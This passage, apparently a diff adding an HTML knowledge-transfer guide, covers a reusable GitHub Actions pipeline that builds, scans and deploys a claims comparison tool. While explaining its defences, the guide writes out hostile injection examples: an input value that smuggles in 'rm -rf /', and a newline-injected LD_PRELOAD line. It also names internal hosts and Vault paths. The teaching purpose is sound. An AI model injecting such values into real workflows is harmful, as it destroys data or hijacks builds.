@@ -1,0 +1,1809 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>CECT GitHub Actions Workflows — Beginner's KT Guide</title>
+<style>
+  :root {
+    --navy: #002677; --orange: #ff612b; --ink: #1f2933; --muted: #5b6770;
+    --bg: #faf8f2; --card: #ffffff; --line: #e3e0d8; --code: #f4f2ec; --accent: #e8f0fe;
+  }
+  * { box-sizing: border-box; }
+  html { scroll-behavior: smooth; scroll-padding-top: 16px; }
+  body { margin: 0; font: 16px/1.65 -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+         color: var(--ink); background: var(--bg); }
+  #layout { display: grid; grid-template-columns: 300px minmax(0, 1fr); min-height: 100vh; }
+  nav { position: sticky; top: 0; height: 100vh; overflow-y: auto; background: var(--navy); color: #fff;
+        padding: 24px 18px; font-size: 14px; }
+  nav h2 { font-size: 15px; letter-spacing: .04em; text-transform: uppercase; color: #ffd2c2; margin: 0 0 12px; }
+  nav a { color: #dbe4ff; text-decoration: none; display: block; padding: 4px 8px; border-radius: 6px; }
+  nav a:hover, nav a.active { background: rgba(255,255,255,.12); color: #fff; }
+  nav .h3 { padding-left: 22px; font-size: 13px; color: #b7c4ea; }
+  nav input { width: 100%; padding: 8px 10px; border-radius: 8px; border: 0; margin-bottom: 14px; font-size: 13px; }
+  main { padding: 40px clamp(20px, 5vw, 72px) 120px; max-width: 1200px; }
+  h1 { color: var(--navy); font-size: 2.3rem; line-height: 1.2; border-bottom: 4px solid var(--orange); padding-bottom: 12px; }
+  h2 { color: var(--navy); margin-top: 3.2rem; padding-top: 1rem; border-top: 1px solid var(--line); font-size: 1.7rem; }
+  h3 { color: #12355b; margin-top: 2.2rem; font-size: 1.3rem; }
+  h4 { color: #12355b; margin-top: 1.6rem; }
+  a { color: #1857c4; }
+  blockquote { margin: 1.2rem 0; padding: 12px 18px; background: var(--accent); border-left: 4px solid #1857c4;
+               border-radius: 0 8px 8px 0; color: #20324d; }
+  blockquote p { margin: .3rem 0; }
+  code { font-family: "SF Mono", Menlo, Consolas, monospace; font-size: .88em; background: var(--code);
+         padding: 1px 5px; border-radius: 4px; }
+  pre:not(.mermaid) { background: #10203a; color: #e6edf7; padding: 16px 18px; border-radius: 10px; overflow-x: auto; }
+  pre:not(.mermaid) code { background: none; color: inherit; padding: 0; }
+  table { border-collapse: collapse; width: 100%; margin: 1.2rem 0; background: var(--card); font-size: .92rem;
+          box-shadow: 0 1px 2px rgba(0,0,0,.05); border-radius: 8px; overflow: hidden; display: block; overflow-x: auto; }
+  th { background: var(--navy); color: #fff; text-align: left; font-weight: 600; }
+  th, td { padding: 9px 12px; border-bottom: 1px solid var(--line); vertical-align: top; }
+  tr:nth-child(even) td { background: #fbfaf7; }
+  pre.mermaid { background: var(--card); border: 1px solid var(--line); border-radius: 12px; padding: 18px;
+                text-align: center; overflow-x: auto; box-shadow: 0 1px 3px rgba(0,0,0,.06); }
+  .mermaid-error { color: #b42318; text-align: left; white-space: pre-wrap; font-size: 12px; }
+  hr { border: 0; border-top: 1px solid var(--line); margin: 2.5rem 0; }
+  #top { position: fixed; right: 22px; bottom: 22px; background: var(--orange); color: #fff; border-radius: 50%;
+         width: 44px; height: 44px; display: grid; place-items: center; text-decoration: none; font-size: 20px;
+         box-shadow: 0 4px 12px rgba(0,0,0,.2); }
+  @media (max-width: 900px) { #layout { grid-template-columns: 1fr; } nav { position: static; height: auto; } }
+  @media print { nav, #top { display: none; } #layout { display: block; } pre.mermaid { break-inside: avoid; } }
+</style>
+</head>
+<body>
+<div id="layout">
+  <nav id="toc"><h2>🚀 CECT CI/CD KT Guide</h2><input id="filter" placeholder="Filter sections…"><div id="toc-links"></div></nav>
+  <main id="content"><p>Loading guide… (needs internet access to load <code>marked</code> and <code>mermaid</code> from jsDelivr)</p></main>
+</div>
+<a id="top" href="#" title="Back to top">↑</a>
+<textarea id="md-source" hidden># 🚀 CECT GitHub Actions Workflows — Beginner's Knowledge-Transfer Guide
+
+> **Repository:** `optum-rx-tech-ops/cect-gh-actions-workflows`
+> **What it contains:** the single **reusable CI/CD pipeline** that builds, scans, and deploys every CECT application (UI, API, DB migrations) to Kubernetes.
+> **Audience:** someone who has **never used GitHub Actions**, and has never seen CECT.
+> **Source of truth:** everything here was read from the source on **2026-11-25**: branch `main` at commit `b594a4d`, plus the `main-uhg-only` and `api-only` branches and the two caller workflows in `claims-extract-comparison-tool-ui-2-0` and `claims-extract-comparison-tool-api`. Line numbers (`L123`) point to `.github/workflows/orx-qec-cect-build-deploy-workflow.yaml` on `main`. They will drift as the file changes, so use them as a map rather than a contract.
+
+---
+
+## 🧭 How to read this guide
+
+| If you are… | Read these sections first |
+|---|---|
+| Brand new to GitHub Actions | 1 → 2 → 3 → 5 → 7 |
+| About to **run** a deployment | 1 → 8 → 17 (Runbooks) → Appendix C (errors) |
+| About to **change** the workflow | 5 → 6 → 9 → 10 → 11 → 18 (Known issues) |
+| Reviewing security | 15 → 10 → 18 |
+| Debugging a failed run | Appendix C → 9 → 17.7 |
+
+All diagrams are written in **Mermaid**. They render on GitHub, in VS Code (with the *Markdown Preview Mermaid Support* extension), and in the companion file [`CECT-GH-Actions-Workflows-KT-Guide.html`](CECT-GH-Actions-Workflows-KT-Guide.html), which you can open in any browser.
+
+---
+
+## 📑 Table of Contents
+
+1. [What is this repository? (The 2-minute version)](#1-what-is-this-repository-the-2-minute-version)
+2. [GitHub Actions crash course](#2-github-actions-crash-course)
+3. [The platform tools the pipeline talks to](#3-the-platform-tools-the-pipeline-talks-to)
+4. [Repository layout](#4-repository-layout)
+5. [System architecture](#5-system-architecture)
+6. [Callers, branches, and versions](#6-callers-branches-and-versions)
+7. [The workflow contract: inputs, outputs, permissions](#7-the-workflow-contract-inputs-outputs-permissions)
+8. [The master flow chart](#8-the-master-flow-chart)
+9. [Step-by-step walkthrough (every step)](#9-step-by-step-walkthrough-every-step)
+10. [Shell function reference (every function)](#10-shell-function-reference-every-function)
+11. [Third-party action reference (every `uses:`)](#11-third-party-action-reference-every-uses)
+12. [Data flow: where every variable comes from](#12-data-flow-where-every-variable-comes-from)
+13. [Sequence diagrams: dev, test, and prod deployments](#13-sequence-diagrams-dev-test-and-prod-deployments)
+14. [Docker image lifecycle &amp; promotion](#14-docker-image-lifecycle--promotion)
+15. [Security model](#15-security-model)
+16. [Design patterns used](#16-design-patterns-used)
+17. [Runbooks: "How do I…?"](#17-runbooks-how-do-i)
+18. [Known issues, tech debt &amp; gotchas](#18-known-issues-tech-debt--gotchas)
+19. [Appendix A — Vault key catalogue](#appendix-a--vault-key-catalogue)
+20. [Appendix B — Environment variable catalogue](#appendix-b--environment-variable-catalogue)
+21. [Appendix C — Error message catalogue](#appendix-c--error-message-catalogue)
+22. [Glossary](#glossary)
+
+---
+
+## 1. What is this repository? (The 2-minute version)
+
+**CECT** (Claims Extract Comparison Tool) is an internal Optum Rx application. It has several code repositories: a **UI** (Next.js), an **API** (Java/Spring, built with Maven), a **Paid-Claims AI** service, Kubernetes configuration, and so on.
+
+Each of those repositories needs the same chores done whenever someone wants to ship a new version:
+
+1. Check that the person is **allowed** to deploy, and that the request is **safe**.
+2. Fetch **secrets** (passwords, kube-config, tokens) from **HashiCorp Vault**.
+3. **Build** the code (Maven for Java, `npm` inside Docker for Node).
+4. **Scan** it: code quality with **SonarQube**, container vulnerabilities with **JFrog Xray** and **Prisma Cloud**.
+5. **Push** the Docker image to **JFrog Artifactory**.
+6. **Deploy** it to **Kubernetes** (dev, test, or prod).
+7. For prod: confirm an approved **ServiceNow change ticket**, then **promote** the image to the release repository.
+8. **Email** the team.
+
+Rather than copy-pasting those ~600 lines into every repository, CECT keeps them **once**, in this repository, as a **reusable workflow**. Each application repository has a tiny "caller" workflow (about 50 lines) that says, in effect, *"run the shared pipeline with these settings."*
+
+```mermaid
+mindmap
+  root((cect-gh-actions-workflows))
+    Guardrails
+      Validate every input
+      main branch only for test and prod
+      Allow-listed deployers only
+      Change ticket for prod
+    Secrets
+      HashiCorp Vault via OIDC
+      Prisma keys via PRM
+    Build
+      Maven JAR and Sonar
+      Docker image with npm or JAR
+    Scan
+      SonarQube
+      JFrog Xray
+      Prisma Cloud
+    Ship
+      Push to JFrog Artifactory
+      kubectl apply to Kubernetes
+      Flyway DB migrations
+    Prod extras
+      ServiceNow change validation
+      Promote image to release
+      Email notification
+```
+
+### The life of a deployment, in one picture
+
+```mermaid
+flowchart LR
+    A(["Engineer clicks&lt;br/>Run workflow&lt;br/>in UI or API repo"]) --> B["Caller workflow&lt;br/>cect-ui-build-deploy-workflow.yaml"]
+    B -->|"uses: ...@branch"| C["Reusable workflow&lt;br/>orx-qec-cect-build-deploy-workflow.yaml"]
+    C --> D{"Guardrails pass?"}
+    D -->|no| X(["Run fails&lt;br/>FATAL ERROR"])
+    D -->|yes| E["Fetch secrets&lt;br/>from Vault"]
+    E --> F{"Environment?"}
+    F -->|"dev / test"| G["Build + scan + push image"]
+    F -->|prod| H["Validate ServiceNow ticket&lt;br/>reuse image built for test"]
+    G --> I["kubectl apply"]
+    H --> I
+    I --> J{"prod?"}
+    J -->|yes| K["Promote image to release"]
+    J -->|no| L(["Done"])
+    K --> L
+```
+
+---
+
+## 2. GitHub Actions crash course
+
+If you have never used GitHub Actions, read this section slowly. Every later section builds on it.
+
+### 2.1 Vocabulary
+
+| Term | What it means | Analogy | Where you see it here |
+|---|---|---|---|
+| **Workflow** | A YAML file in `.github/workflows/` describing an automated process. | A recipe. | `orx-qec-cect-build-deploy-workflow.yaml` |
+| **Trigger** (`on:`) | What starts the workflow: a push, a button click, a schedule, or another workflow. | The oven timer. | `on: workflow_call` (L10) |
+| **`workflow_dispatch`** | A manual trigger. GitHub shows a **"Run workflow"** button with a form. | A doorbell. | The **caller** workflows in the UI/API repos |
+| **`workflow_call`** | Makes a workflow **reusable**: other workflows can call it like a function. | A function definition. | This repo (L11) |
+| **Job** | A group of steps that runs on **one machine**. Jobs run in parallel unless linked by `needs:`. | One cook at one station. | `build-deploy` (L48), `promote-docker-image-to-release` (L603) |
+| **Step** | One command (`run:`) or one packaged action (`uses:`) inside a job. Steps run **in order**. | One line in the recipe. | 33 steps in `build-deploy` |
+| **Runner** | The machine that executes a job. | The kitchen. | `runs-on: uhg-runner`, a UHG **self-hosted** runner |
+| **Action** | A reusable, versioned building block (`owner/repo@version`). | A kitchen appliance. | `actions/checkout@v4`, `uhg-pipelines/epl-docker/build-scan-push@v4`, … |
+| **Expression** `${{ … }}` | Evaluated by GitHub **before** the step runs; the result is pasted into the YAML. | A mail-merge field. | `${{ inputs.ENVIRONMENT }}` |
+| **`if:`** | A condition: the step or job runs only if it is true. | "Only if the oven is hot." | Almost every step |
+| **Context** | A read-only object you can use in expressions. | Global variables. | `inputs`, `env`, `github`, `steps`, `needs` |
+| **`$GITHUB_ENV`** | A special file. Lines `KEY=value` written to it become **environment variables for all later steps**. | A shared whiteboard. | `printf 'SAFE_ENVIRONMENT=%s\n' … >> "$GITHUB_ENV"` |
+| **`$GITHUB_OUTPUT`** | A special file. Lines written to it become `steps.&lt;id>.outputs.&lt;name>`. | A step's return value. | `setoutputs` step (L517) |
+| **Job outputs** | Values a job exposes to jobs that `needs:` it. | A job's return value. | L56-61 |
+| **`needs:`** | "Run this job only after that one succeeds." | A dependency arrow. | L604 |
+| **`secrets: inherit`** | Pass all of the caller's secrets to a called workflow. | Hand over your keyring. | L607 |
+| **`permissions:`** | What the auto-generated `GITHUB_TOKEN` (and OIDC) may do. | A badge's access level. | L3-8, L50-55 |
+| **OIDC token** | A short-lived signed JWT that GitHub issues to a job, proving "I am repo X running workflow Y". Cloud and Vault systems can trust it **instead of a stored password**. | A one-day visitor badge. | `id-token: write` + Vault `method: jwt` |
+
+### 2.2 The `${{ }}` vs `$VAR` difference (important!)
+
+There are **two** substitution systems, and mixing them up is the #1 cause of security bugs in GitHub Actions:
+
+```mermaid
+flowchart LR
+    subgraph GH["1 · On GitHub's servers, before the step starts"]
+      E["YAML text containing an&lt;br/>expression such as inputs.X"] --> R["Expression replaced&lt;br/>by its value as plain text"]
+    end
+    subgraph RUN["2 · On the runner, while the step runs"]
+      S["bash script"] --> V["$VAR read from the environment"]
+    end
+    R --> S
+```
+
+- `${{ inputs.X }}` is a **text paste**. If you write `run: echo ${{ inputs.X }}` and someone passes `x; rm -rf /`, bash sees `echo x; rm -rf /`. That is a **script-injection** vulnerability.
+- The safe pattern, used throughout this workflow, is to map the expression into an `env:` variable and use `"$VAR"` (quoted) in the script:
+
+```yaml
+- name: Validate and set safe environment input   # L70
+  env:
+    ENVIRONMENT_INPUT: ${{ inputs.ENVIRONMENT }}   # pasted into an env var, not into the script
+  run: |
+    SAFE_ENVIRONMENT_INPUT=$(printf '%s' "$ENVIRONMENT_INPUT" | tr -d '\n\r')
+```
+
+### 2.3 How a reusable workflow is called
+
+```mermaid
+sequenceDiagram
+    autonumber
+    actor Dev as Engineer
+    participant GH as GitHub
+    participant Caller as Caller workflow (UI repo)
+    participant Reusable as Reusable workflow (this repo)
+    participant Runner as uhg-runner
+    Dev->>GH: Click "Run workflow", fill form (ENVIRONMENT, tag, ...)
+    GH->>Caller: Start, event = workflow_dispatch
+    Caller->>Reusable: jobs.build-deploy.uses ...@main-uhg-only with inputs
+    Note over Reusable: github context is still the CALLER's&lt;br/>(repo name, ref, actor, event)
+    Reusable->>Runner: Schedule job build-deploy
+    Runner-->>Reusable: Steps run, outputs set
+    Reusable->>GH: Job promote-docker-image-to-release (prod only)
+    GH-->>Dev: Run summary, logs, email
+```
+
+> 💡 **Key fact:** inside a reusable workflow, `github.repository`, `github.ref`, `github.actor` and `github.event` all describe the **caller**. That is why the same pipeline can name the Docker image after whichever repository called it.
+
+### 2.4 The two special files, by example
+
+```bash
+# Step 1
+printf 'SAFE_ENVIRONMENT=%s\n' "dev" >> "$GITHUB_ENV"
+printf 'run-promote=%s\n' "false" >> "$GITHUB_OUTPUT"   # step has id: setoutputs
+
+# Step 2 (any later step in the same job)
+echo "$SAFE_ENVIRONMENT"                 # -> dev        (shell)
+# ${{ env.SAFE_ENVIRONMENT }}            # -> dev        (expression)
+# ${{ steps.setoutputs.outputs.run-promote }}  -> false  (expression)
+```
+
+Because `$GITHUB_ENV` is parsed line-by-line as `KEY=value`, a value containing a **newline** can smuggle in a second, attacker-chosen line such as `LD_PRELOAD=/tmp/evil.so`. This is called **environment-variable injection**, and it is why nearly every step here strips `\n` and `\r` before writing (see [§15](#15-security-model)).
+
+---
+
+## 3. The platform tools the pipeline talks to
+
+| Tool | What it is | Why the pipeline uses it | Beginner analogy |
+|---|---|---|---|
+| **HashiCorp Vault** (`pam-dev.uhc.com`) | Central secret store. | All passwords, tokens, kube-configs and most settings live here, not in Git. | A bank vault with labelled drawers. |
+| **PRM** (`prm.optum.com`) | UHG's privileged-secret manager. | Holds the shared **Prisma** scanner credentials. | A second, enterprise-owned vault. |
+| **JFrog Artifactory (SaaS)** | Package and Docker registry. **Central** = where images are pushed. **Edge internal** (`edgeinternal1uhg.uhg.com`) = a UHG-network replica the clusters pull from. | Stores built images, proxies Maven/npm downloads. | A warehouse (central) with local pickup points (edge). |
+| **JFrog Xray** | Vulnerability scanner built into Artifactory. | Scans each pushed image. | Airport X-ray for packages. |
+| **Prisma Cloud (twistcli)** | Palo Alto container security scanner. | Second, independent image scan, required by UHG policy. | A second security checkpoint. |
+| **SonarQube** | Static code analysis. | Code smells, bugs, coverage, quality gate (`vitals.yaml` declares `targetQG: ADOPTION`). | A spell-checker for code quality. |
+| **Maven** | Java build tool. | Builds the API JAR (`clean install …`). | `make` for Java. |
+| **Docker** | Packages an app and its runtime into an image. | Every deployable app ships as an image. | A shipping container. |
+| **Kubernetes (K8s)** | Runs containers in a cluster. | The dev/test/prod environments. | A port that unloads containers and keeps them running. |
+| **`kubectl apply`** | Sends a YAML description to K8s. | Rolls out the new image. | Handing the port manager a manifest. |
+| **Flyway** | Database migration tool. | `BUILD_TYPE=Flyway` runs DB schema migrations. | Versioned "patch scripts" for the DB. |
+| **ServiceNow** (`optum.service-now.com`) | IT change management. | Prod deploys require an **approved change ticket** in its window. | A permit office. |
+| **EPL actions** (`uhg-pipelines/epl-*`) | UHG's *Enterprise Pipeline Library*: approved, pre-built actions. | Standardised build, scan, push, deploy steps. | Company-approved power tools. |
+| **`uhg-runner`** | Self-hosted GitHub Actions runner inside the UHG network. | Needs access to internal Vault, Artifactory, clusters. | An in-house kitchen instead of a rented one. |
+
+---
+
+## 4. Repository layout
+
+The repository is small. Nearly all of the logic is in one file.
+
+```text
+cect-gh-actions-workflows/
+├── .github/
+│   └── workflows/
+│       └── orx-qec-cect-build-deploy-workflow.yaml   ← THE pipeline (613 lines)
+├── vitals.yaml                                        ← UHG "vitals" metadata (ASK ID, Sonar key, quality gate)
+├── .gitignore                                         ← IDE / OS junk files
+└── docs/
+    ├── CECT-GH-Actions-Workflows-KT-Guide.md          ← this guide
+    └── CECT-GH-Actions-Workflows-KT-Guide.html        ← same guide, rendered
+```
+
+### 4.1 `vitals.yaml`
+
+```yaml
+apiVersion: v1
+metadata:
+  askId: UHGWM110-027861                 # UHG application ID (ASK)
+  caAgileId: 266663055900d               # Rally / CA Agile team ID
+  projectKey: com.optumrx.qec:claims-extract-comparison-tool-api   # Sonar project key
+  projectFriendlyName: claims-extract-comparison-tool-api
+  componentType: code
+  targetQG: ADOPTION                     # Sonar quality-gate tier the project targets
+```
+
+This file is read by UHG governance tooling (not by the workflow). It ties the repository to the CECT application's ASK ID and Sonar project.
+
+### 4.2 Related repositories
+
+```mermaid
+flowchart TB
+    subgraph Apps["Application repositories (callers)"]
+      UI["claims-extract-comparison-tool-ui-2-0&lt;br/>.github/workflows/cect-ui-build-deploy-workflow.yaml&lt;br/>deployment.yaml (K8s template)"]
+      API["claims-extract-comparison-tool-api&lt;br/>.github/workflows/cect-api-build-deploy-workflow.yaml&lt;br/>deployment.yaml (K8s template)"]
+    end
+    WF["cect-gh-actions-workflows&lt;br/>(this repo)"]
+    K8SCFG["cect-k8s-config&lt;br/>ConfigMaps, Ingress, DDL scripts&lt;br/>(applied separately)"]
+    EPL["uhg-pipelines/*&lt;br/>EPL actions + privileged-workflows"]
+    UI -->|"uses @main-uhg-only"| WF
+    API -->|"uses @api-only"| WF
+    WF -->|uses| EPL
+    UI -. pods read ConfigMaps and Secrets from .-> K8SCFG
+    API -. pods read ConfigMaps and Secrets from .-> K8SCFG
+```
+
+---
+
+## 5. System architecture
+
+### 5.1 Big picture
+
+```mermaid
+flowchart LR
+    DEV(["Engineer"])
+    subgraph GHEC["GitHub Enterprise Cloud"]
+      CALLER["Caller workflow&lt;br/>(UI / API repo)"]
+      REUSE["Reusable workflow&lt;br/>(this repo)"]
+      OIDC["GitHub OIDC&lt;br/>token issuer"]
+      PRIV["uhg-pipelines/privileged-workflows&lt;br/>promote-docker-image.yaml@v3"]
+    end
+    subgraph UHGNET["UHG network"]
+      RUNNER["uhg-runner&lt;br/>(self-hosted)"]
+      VAULT[("HashiCorp Vault&lt;br/>pam-dev.uhc.com&lt;br/>ns OPTUM/APP/CECT/STAGE")]
+      PRM[("PRM&lt;br/>prisma creds")]
+      EDGE[("JFrog edge internal&lt;br/>edgeinternal1uhg.uhg.com")]
+      subgraph K8S["Kubernetes clusters"]
+        NSD["dev namespace"]
+        NST["test namespace"]
+        NSP["prod namespace"]
+      end
+      SN["ServiceNow&lt;br/>optum.service-now.com"]
+      MAIL["SMTP relay&lt;br/>epl-send-mail"]
+    end
+    subgraph SAAS["SaaS"]
+      CENTRAL[("JFrog Artifactory SaaS&lt;br/>central + Xray")]
+      PRISMA["Prisma Cloud SaaS"]
+      SONAR["SonarQube"]
+    end
+    DEV -->|"Run workflow"| CALLER --> REUSE --> RUNNER
+    RUNNER -- "JWT from" --> OIDC
+    RUNNER -- "JWT login, read kv" --> VAULT
+    RUNNER --> PRM
+    RUNNER -- "docker push" --> CENTRAL
+    CENTRAL -- replicate --> EDGE
+    RUNNER -- scan --> PRISMA
+    RUNNER -- "mvn sonar" --> SONAR
+    RUNNER -- "kubectl apply" --> K8S
+    K8S -- "image pull" --> EDGE
+    RUNNER -- "validate ticket" --> SN
+    RUNNER --> MAIL
+    REUSE -- "prod only" --> PRIV -- "promote to release" --> CENTRAL
+```
+
+### 5.2 Layered view of the pipeline
+
+```mermaid
+flowchart TB
+    L1["① Trigger layer&lt;br/>workflow_dispatch in caller → workflow_call here"]
+    L2["② Guardrail layer&lt;br/>input allow-lists · branch rule · ref sanitising · deployer list · change ticket"]
+    L3["③ Secrets layer&lt;br/>Vault (OIDC/JWT) · PRM · JFrog OIDC token exchange"]
+    L4["④ Build &amp; scan layer&lt;br/>JDK · Maven · Sonar · Docker build · Xray · Prisma"]
+    L5["⑤ Release layer&lt;br/>push to JFrog · ServiceNow gate · patch K8s template · kubectl apply · Flyway"]
+    L6["⑥ Post-release layer&lt;br/>promote image to release repo · email"]
+    L1 --> L2 --> L3 --> L4 --> L5 --> L6
+```
+
+### 5.3 Job graph
+
+```mermaid
+flowchart LR
+    BD["Job 1: build-deploy&lt;br/>runs-on: uhg-runner&lt;br/>33 steps"]
+    PR["Job 2: promote-docker-image-to-release&lt;br/>reusable: privileged-workflows&lt;br/>if run-promote == 'true'"]
+    BD -->|"needs + 5 outputs"| PR
+```
+
+---
+
+## 6. Callers, branches, and versions
+
+### 6.1 Who calls this workflow
+
+| Caller repo | Caller file | Pins to branch | Inputs it exposes | Fixed choices |
+|---|---|---|---|---|
+| `claims-extract-comparison-tool-ui-2-0` | `.github/workflows/cect-ui-build-deploy-workflow.yaml` | **`@main-uhg-only`** | ENVIRONMENT, BUILD_TYPE, ARTIFACT_TYPE, DOCKER_IMAGE_TAG, DOCKER_FILE, SN_CHANGE_TICKET | BUILD_TYPE=`NodeJS`, ARTIFACT_TYPE=`ui`, DOCKER_FILE=`surfaces/cect-ui/Dockerfile` |
+| `claims-extract-comparison-tool-api` | `.github/workflows/cect-api-build-deploy-workflow.yaml` | **`@api-only`** | ENVIRONMENT, BUILD_TYPE, ARTIFACT_TYPE, DOCKER_IMAGE_TAG, SN_CHANGE_TICKET, MAVEN_BUILD_COMMAND | BUILD_TYPE=`Maven`, ARTIFACT_TYPE=`api`, MAVEN_BUILD_COMMAND=`clean install -Ddependency-check.skip=true` |
+
+The UI caller in full, so you can see how small a caller is:
+
+```yaml
+name: ORx QEC CECT UI build and deploy
+permissions:
+  id-token: write        # needed so the called workflow can get an OIDC token for Vault
+  actions: read
+  contents: write
+  pull-requests: read
+  security-events: write
+on:
+  workflow_dispatch:     # adds the "Run workflow" button
+    inputs:
+      ENVIRONMENT:      { type: choice, options: [dev, test, prod], default: dev, required: true }
+      BUILD_TYPE:       { type: choice, options: [NodeJS], default: NodeJS, required: true }
+      ARTIFACT_TYPE:    { type: choice, options: [ui], default: ui, required: true }
+      DOCKER_IMAGE_TAG: { type: string, required: true }
+      DOCKER_FILE:      { type: string, default: "surfaces/cect-ui/Dockerfile" }
+      SN_CHANGE_TICKET: { type: string }
+jobs:
+  build-deploy:
+    uses: optum-rx-tech-ops/cect-gh-actions-workflows/.github/workflows/orx-qec-cect-build-deploy-workflow.yaml@main-uhg-only
+    with:
+      ENVIRONMENT: ${{ inputs.ENVIRONMENT }}
+      # ...each input passed straight through...
+```
+
+*(Condensed to flow-style YAML for readability; the real file uses block style.)*
+
+> ⚠️ A called workflow can **never have more permissions than its caller grants**. If a caller forgets `id-token: write`, the Vault step fails with an OIDC error even though this repo declares it.
+
+### 6.2 The three long-lived branches
+
+The two callers pin **different branches**, and those branches have drifted apart from `main`:
+
+```mermaid
+gitGraph
+    commit id: "cedfb4c promote v3"
+    commit id: "d8e180e ODI Gov sonar"
+    commit id: "f82b08c sanitize GITHUB_ENV"
+    commit id: "1eb712f odi-gov key rename"
+    branch api-only
+    commit id: "a90a283 drop ODI Gov"
+    commit id: "c046c32 core sonar prefix"
+    commit id: "09131da uhg url only"
+    checkout main
+    commit id: "dd7b221 remove nodejs"
+    commit id: "78f86d2 revert sonar"
+    commit id: "b594a4d uhg urls only"
+    branch main-uhg-only
+    commit id: "c55f36f optum to uhg"
+    commit id: "b7dbfb6 build-scan-push v5"
+    commit id: "07a5869 revert to v4"
+    commit id: "e5b8e0b uhg edge host"
+    commit id: "218e57f revert jf v4"
+```
+
+*(Simplified: some commits omitted. `api-only` forked from `main` at `1eb712f`; `main-uhg-only` forked at `main`'s current tip `b594a4d`.)*
+
+| Area | `main` (b594a4d) | `main-uhg-only` (used by **UI**) | `api-only` (used by **API**) |
+|---|---|---|---|
+| Edge registry Vault key | `jf-saas-edgeint-docker-base-url` → `JF_SAAS_EDGEINT_UHG_DOCKER_BASE_URL` | same as main | **two** keys: `jf-saas-edgeint-docker-base-url` → `JF_SAAS_EDGEINT_DOCKER_BASE_URL` **and** `jf-saas-edgeint-uhg-docker-base-url` → `JF_SAAS_EDGEINT_UHG_DOCKER_BASE_URL`; uses the **non-UHG** one everywhere |
+| Edge host rewrite | none | rewrites `.optum.com` → `.uhg.com` in the edge URL | none |
+| ODI-Gov Sonar Vault keys | fetched (unused) | fetched (unused) | removed |
+| Duplicate "Login to JFrog SaaS edge internal" step (L468) | **present** | removed | present, but its sibling at L460 uses the non-UHG URL |
+| Docker build-args for Sonar | `CORE_SONAR_PROJECT_KEY=${{ env.SONAR_PROJECT_KEY }}` (**unset** variable) | same as main | `CORE_SONAR_PROJECT_KEY=${{ env.CORE_SONAR_PROJECT_KEY }}` (correct) + `SONAR_BRANCH` |
+
+> 📌 **Rule of thumb:** when you fix something in this repo, decide which callers need it and **cherry-pick to `main-uhg-only` and/or `api-only`**. Merging to `main` alone changes nothing for the UI or API pipelines today.
+
+---
+
+## 7. The workflow contract: inputs, outputs, permissions
+
+### 7.1 Inputs (`on.workflow_call.inputs`, L12-45)
+
+| Input | Type | Required | Default | Allowed values (enforced at) | Used for |
+|---|---|---|---|---|---|
+| `ENVIRONMENT` | string | ✅ | — | `dev` \| `test` \| `prod` (L76-84) | Vault path, K8s namespace, image name, gates |
+| `BUILD_TYPE` | string | ✅ | — | `Maven` \| `MavenJAR` \| `Flyway` \| `Docker` \| `NodeJS` (L270-278) | Which build/deploy steps run |
+| `ARTIFACT_TYPE` | string | ✅ | — | `^[A-Za-z0-9._-]+$` (L343) | Middle segment of image path (`ui`, `api`) |
+| `DOCKER_IMAGE_TAG` | string | ❌ | — | empty or `^[A-Za-z0-9._-]+$` (L288, L349) | Image tag; in practice required for image builds |
+| `DOCKER_FILE` | string | ❌ | — | not validated | Dockerfile path for `build-scan-push` |
+| `SN_CHANGE_TICKET` | string | ❌ | — | empty or `^[A-Za-z0-9_-]+$` (L240); **required for prod** (L247) | ServiceNow change validation, email |
+| `MAVEN_BUILD_COMMAND` | string | ❌ | — | not validated | Maven goals for `Maven` / `MavenJAR` |
+| `BRANCH` | string | ❌ | — | must pass `git check-ref-format --branch`; **dev only** | Branch override for scheduled runs |
+| `DEPLOY_TRIGGERED_BY_SCHEDULE` | string | ❌ | `"NO"` | `YES` \| `NO` (L227-233) | Enables BRANCH override and Vault-supplied change ticket |
+
+> `BRANCH` and `DEPLOY_TRIGGERED_BY_SCHEDULE` exist for a **scheduled** caller (a cron job that deploys nightly). Neither current caller uses them, so they always take their defaults.
+
+### 7.2 What each BUILD_TYPE means
+
+| BUILD_TYPE | Meaning | Builds on runner | Docker image? | Deploys to K8s? | Who uses it today |
+|---|---|---|---|---|---|
+| `Maven` | Java service: Maven build + Sonar, then Docker image that copies the JAR | JAR (`mvn`) | ✅ | ✅ | **API** |
+| `MavenJAR` | Java library or batch JAR: Maven build + Sonar **only** | JAR | ❌ | ❌ | none |
+| `Flyway` | Run DB migrations via a Maven Flyway command from Vault | — | ❌ | ❌ | none (no Flyway plugin in the current API `pom.xml`) |
+| `Docker` | Generic Dockerfile build | — | ✅ | ✅ | none |
+| `NodeJS` | Node app; `npm ci &amp;&amp; npm run build` happen **inside** the Dockerfile | — | ✅ | ✅ | **UI** |
+
+> In the YAML, `Docker` and `NodeJS` behave identically. Every image condition is written as *"not Flyway and not MavenJAR"*.
+
+### 7.3 Job outputs (L56-61)
+
+| Output | Source (`steps.setoutputs.outputs.*`) | Example | Consumed by |
+|---|---|---|---|
+| `run-promote-docker-image-to-release` | `"true"` only if prod **and** image build type | `true` | `if:` of job 2 |
+| `jfrog-saas-project-key` | `JF_SAAS_PROJECT_KEY` (Vault) | `&lt;project key from Vault>` | promote `jfrog-project-key` |
+| `jfrog-saas-central-docker-base-url` | `SAFE_JF_SAAS_CENTRAL_DOCKER_BASE_URL` | `&lt;central-host>` | promote `jfrog-url` |
+| `docker-img-suffix-no-namespace` | `DOCKER_IMG_SUFFIX_NO_NAMESPACE` | `claims-extract-comparison-tool-ui-2-0/ui/claims-extract-comparison-tool-ui-2-0` | promote `source-docker-image-name` |
+| `docker-image-tag` | `SAFE_DOCKER_IMAGE_TAG` | `R26.11.25` | promote `source-docker-image-tag` |
+
+### 7.4 Permissions (L3-8, repeated at job level L50-55)
+
+| Permission | Why it is needed |
+|---|---|
+| `id-token: write` | Lets the job request a GitHub **OIDC JWT**, used for Vault login and the JFrog OIDC exchange. |
+| `actions: read` | Lets EPL actions read workflow/run metadata. |
+| `contents: write` | Checkout, plus anything an EPL action writes back (build info, tags). |
+| `pull-requests: read` | Lets actions read PR metadata (likely for Sonar PR decoration). |
+| `security-events: write` | Lets scanners upload results (SARIF) to GitHub code scanning, if they choose to. |
+
+---
+
+## 8. The master flow chart
+
